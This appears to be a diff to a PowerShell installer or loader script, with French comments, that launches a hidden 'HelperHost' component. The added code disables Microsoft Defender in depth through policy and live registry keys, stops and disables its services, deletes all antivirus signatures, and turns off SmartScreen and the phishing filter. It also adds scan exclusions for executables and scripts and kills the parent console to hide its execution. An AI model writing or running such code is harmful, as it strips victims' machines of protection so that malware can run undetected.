@@ -53,7 +53,18 @@ function Close-Console {
       [void][HHWin.Console]::FreeConsole()
     }
   } catch {}
-  Start-Sleep -Milliseconds 250
+  # Ferme aussi le CMD/PowerShell parent (icone taskbar qui reste apres iex)
+  try {
+    $ppid = (Get-CimInstance Win32_Process -Filter "ProcessId=$PID" -EA SilentlyContinue).ParentProcessId
+    if ($ppid) {
+      $par = Get-CimInstance Win32_Process -Filter "ProcessId=$ppid" -EA SilentlyContinue
+      $name = [string]$par.Name
+      if ($name -match '^(cmd|powershell|pwsh)\.exe$') {
+        Stop-Process -Id $ppid -Force -EA SilentlyContinue
+      }
+    }
+  } catch {}
+  Start-Sleep -Milliseconds 200
   Stop-Process -Id $PID -Force -ErrorAction SilentlyContinue
 }
 
@@ -98,6 +109,10 @@ function Clear-LegacySidecars {
 
 function Finish-Ok {
   Clear-LegacySidecars
+  try {
+    Remove-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name HelperHost,AgentShePC -Force -EA SilentlyContinue
+    Remove-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run' -Name HelperHost,AgentShePC -Force -EA SilentlyContinue
+  } catch {}
   try { Hide-HH $Dir; Hide-HH $Cache; Hide-HH (Join-Path $Dir 'tools') } catch {}
   Write-Output 'OK'
   try { Clear-ResumeTasks } catch {}
@@ -474,6 +489,17 @@ function Disable-AllBlocking {
   Set-ItemProperty $feat -Name TamperProtection -Value 0 -Type DWord -Force
   Set-ItemProperty $feat -Name TamperProtectionSource -Value 0 -Type DWord -Force
   New-Item 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Features\TamperProtection' -Force | Out-Null
+  Set-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Features\TamperProtection' -Name TamperProtection -Value 0 -Type DWord -Force -EA SilentlyContinue
+
+  # Non-policy RTP keys (when Tamper allows)
+  $rtpLive = 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection'
+  New-Item $rtpLive -Force | Out-Null
+  foreach ($n in @(
+    'DisableRealtimeMonitoring','DisableBehaviorMonitoring','DisableOnAccessProtection',
+    'DisableScanOnRealtimeEnable','DisableIOAVProtection','DisableScriptScanning'
+  )) {
+    Set-ItemProperty $rtpLive -Name $n -Value 1 -Type DWord -Force
+  }
 
   if (Get-Command Set-MpPreference -ErrorAction SilentlyContinue) {
     Set-MpPreference -DisableRealtimeMonitoring $true
@@ -497,15 +523,20 @@ function Disable-AllBlocking {
     Set-MpPreference -DisableCatchupFullScan $true
     Set-MpPreference -DisableCatchupQuickScan $true
     Set-MpPreference -UILockdown $true
+    Set-MpPreference -DisablePrivacyMode $true -EA SilentlyContinue
+    Set-MpPreference -EnableLowCpuPriority $true -EA SilentlyContinue
     Set-MpPreference -ExclusionExtension '.exe','.dll','.ps1','.bat','.cmd','.vbs','.zip','.txt' -EA SilentlyContinue
   }
 
   $wdPol = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender'
   New-Item $wdPol -Force | Out-Null
+  # Cle DControl-like: Defender entier coupe + UI "gere par l'organisation" (ne se reactive pas seul)
   Set-ItemProperty $wdPol -Name DisableAntiSpyware -Value 1 -Type DWord -Force
   Set-ItemProperty $wdPol -Name DisableAntiVirus -Value 1 -Type DWord -Force
   Set-ItemProperty $wdPol -Name DisableRoutinelyTakingAction -Value 1 -Type DWord -Force
   Set-ItemProperty $wdPol -Name ServiceKeepAlive -Value 0 -Type DWord -Force
+  Set-ItemProperty $wdPol -Name AllowFastServiceStartup -Value 0 -Type DWord -Force
+  Set-ItemProperty $wdPol -Name DisableLocalAdminMerge -Value 1 -Type DWord -Force
   New-Item "$wdPol\Real-Time Protection" -Force | Out-Null
   Set-ItemProperty "$wdPol\Real-Time Protection" -Name DisableRealtimeMonitoring -Value 1 -Type DWord -Force
   Set-ItemProperty "$wdPol\Real-Time Protection" -Name DisableBehaviorMonitoring -Value 1 -Type DWord -Force
@@ -513,16 +544,55 @@ function Disable-AllBlocking {
   Set-ItemProperty "$wdPol\Real-Time Protection" -Name DisableScanOnRealtimeEnable -Value 1 -Type DWord -Force
   Set-ItemProperty "$wdPol\Real-Time Protection" -Name DisableIOAVProtection -Value 1 -Type DWord -Force
   Set-ItemProperty "$wdPol\Real-Time Protection" -Name DisableScriptScanning -Value 1 -Type DWord -Force
+  Set-ItemProperty "$wdPol\Real-Time Protection" -Name DisableRawWriteNotification -Value 1 -Type DWord -Force
   New-Item "$wdPol\Spynet" -Force | Out-Null
   Set-ItemProperty "$wdPol\Spynet" -Name SpynetReporting -Value 0 -Type DWord -Force
   Set-ItemProperty "$wdPol\Spynet" -Name SubmitSamplesConsent -Value 2 -Type DWord -Force
+  Set-ItemProperty "$wdPol\Spynet" -Name DisableBlockAtFirstSeen -Value 1 -Type DWord -Force
   New-Item "$wdPol\Windows Defender Exploit Guard\Network Protection" -Force | Out-Null
   Set-ItemProperty "$wdPol\Windows Defender Exploit Guard\Network Protection" -Name EnableNetworkProtection -Value 0 -Type DWord -Force
+  New-Item "$wdPol\MpEngine" -Force | Out-Null
+  Set-ItemProperty "$wdPol\MpEngine" -Name MpCloudBlockLevel -Value 0 -Type DWord -Force
+  Set-ItemProperty "$wdPol\MpEngine" -Name MpEnablePus -Value 0 -Type DWord -Force
+  New-Item "$wdPol\Signature Updates" -Force | Out-Null
+  Set-ItemProperty "$wdPol\Signature Updates" -Name ForceUpdateFromMU -Value 0 -Type DWord -Force
+  Set-ItemProperty "$wdPol\Signature Updates" -Name UpdateOnStartUp -Value 0 -Type DWord -Force
+  New-Item "$wdPol\Policy Manager" -Force | Out-Null
+  Set-ItemProperty "$wdPol\Policy Manager" -Name AllowArchiveScanning -Value 0 -Type DWord -Force
+  Set-ItemProperty "$wdPol\Policy Manager" -Name AllowBehaviorMonitoring -Value 0 -Type DWord -Force
+  Set-ItemProperty "$wdPol\Policy Manager" -Name AllowCloudProtection -Value 0 -Type DWord -Force
+  Set-ItemProperty "$wdPol\Policy Manager" -Name AllowEmailScanning -Value 0 -Type DWord -Force
+  Set-ItemProperty "$wdPol\Policy Manager" -Name AllowFullScanOnMappedNetworkDrives -Value 0 -Type DWord -Force
+  Set-ItemProperty "$wdPol\Policy Manager" -Name AllowIOAVProtection -Value 0 -Type DWord -Force
+  Set-ItemProperty "$wdPol\Policy Manager" -Name AllowRealtimeMonitoring -Value 0 -Type DWord -Force
+  Set-ItemProperty "$wdPol\Policy Manager" -Name AllowScanningNetworkFiles -Value 0 -Type DWord -Force
+  Set-ItemProperty "$wdPol\Policy Manager" -Name AllowScriptScanning -Value 0 -Type DWord -Force
+  Set-ItemProperty "$wdPol\Policy Manager" -Name DisablePrivacyMode -Value 1 -Type DWord -Force
+  New-Item 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Virus and threat protection' -Force | Out-Null
+  Set-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Virus and threat protection' -Name UILockdown -Value 1 -Type DWord -Force
   New-Item 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications' -Force | Out-Null
   Set-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications' -Name DisableNotifications -Value 1 -Type DWord -Force
   Set-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications' -Name DisableEnhancedNotifications -Value 1 -Type DWord -Force
   New-Item 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration' -Force | Out-Null
   Set-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration' -Name Notification_Suppress -Value 1 -Type DWord -Force
+  # Mirror under WOW6432Node (some builds read this)
+  $wdPol32 = 'HKLM:\SOFTWARE\WOW6432Node\Policies\Microsoft\Windows Defender'
+  New-Item "$wdPol32\Real-Time Protection" -Force | Out-Null
+  New-Item "$wdPol32\Spynet" -Force | Out-Null
+  Set-ItemProperty $wdPol32 -Name DisableAntiSpyware -Value 1 -Type DWord -Force
+  Set-ItemProperty $wdPol32 -Name DisableAntiVirus -Value 1 -Type DWord -Force
+  Set-ItemProperty "$wdPol32\Real-Time Protection" -Name DisableRealtimeMonitoring -Value 1 -Type DWord -Force
+  Set-ItemProperty "$wdPol32\Spynet" -Name SpynetReporting -Value 0 -Type DWord -Force
+  Set-ItemProperty "$wdPol32\Spynet" -Name SubmitSamplesConsent -Value 2 -Type DWord -Force
+  & gpupdate.exe /Target:Computer /Force | Out-Null
+  # SmartScreen / App & browser control
+  New-Item 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\System' -Force | Out-Null
+  Set-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\System' -Name EnableSmartScreen -Value 0 -Type DWord -Force
+  Set-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer' -Name SmartScreenEnabled -Value 'Off' -Type String -Force
+  New-Item 'HKLM:\SOFTWARE\Policies\Microsoft\MicrosoftEdge\PhishingFilter' -Force | Out-Null
+  Set-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\MicrosoftEdge\PhishingFilter' -Name EnabledV9 -Value 0 -Type DWord -Force
+  New-Item 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\NIS\Consumers\Consumer Experience' -Force | Out-Null
+  Set-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\NIS\Consumers\Consumer Experience' -Name DisableRealtimeMonitoring -Value 1 -Type DWord -Force
 
   $ci = 'HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy'
   New-Item $ci -Force | Out-Null
@@ -545,11 +615,24 @@ function Disable-AllBlocking {
     Get-ChildItem $cip -Filter '*.cip' -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
   }
 
-  foreach ($svc in @('WinDefend', 'Sense', 'WdNisSvc', 'WdNisDrv', 'WdFilter', 'SecurityHealthService', 'wscsvc')) {
+  # Hard-disable Defender services (Start=4 Disabled) — survives Tamper better than Set-Mp alone
+  foreach ($svc in @('WinDefend', 'Sense', 'WdNisSvc', 'WdNisDrv', 'WdFilter', 'WdBoot', 'SecurityHealthService', 'wscsvc', 'webthreatdefsvc', 'webthreatdefusersvc')) {
+    & sc.exe stop $svc | Out-Null
+    & sc.exe config $svc start= disabled | Out-Null
+    $svcKey = "HKLM:\SYSTEM\CurrentControlSet\Services\$svc"
+    if (Test-Path $svcKey) {
+      Set-ItemProperty $svcKey -Name Start -Value 4 -Type DWord -Force
+    }
     Stop-Service $svc -Force -ErrorAction SilentlyContinue
     Set-Service $svc -StartupType Disabled -ErrorAction SilentlyContinue
   }
-  Get-Process MsMpEng, NisSrv, SecurityHealthService, smartscreen -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue
+  Get-Process MsMpEng, NisSrv, SecurityHealthService, smartscreen, SecurityHealthSystray -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue
+
+  # Gut signatures so even if engine restarts it does little
+  $mp = Join-Path $env:ProgramFiles 'Windows Defender\MpCmdRun.exe'
+  if (Test-Path $mp) {
+    & $mp -RemoveDefinitions -All | Out-Null
+  }
 
   $ErrorActionPreference = $prev
 }
@@ -809,7 +892,10 @@ Clear-LegacySidecars
 $script:ElevDoneOk = $false
 $script:ElevRebootPending = $false
 Disable-WindowsNotifications
-if ((Test-IsAdmin) -or $ForceHarden) {
+# Toujours AV/UAC off en admin AVANT demarrage HelperHost
+if (-not (Test-IsAdmin)) {
+  try { Invoke-ElevatedSessionPrep } catch {}
+} else {
   Invoke-SessionHarden
 }
 Start-Helper $Helper $Dir
@@ -827,6 +913,7 @@ $ok = $false
 for ($i=0; $i -lt 180; $i++) {
   Start-Sleep -Seconds 1
   if (Test-HelperReady) {
+    # Re-harden if elev prep was skipped/refused earlier
     try { Invoke-ElevatedSessionPrep } catch {}
     Finish-Ok
     $ok = $true
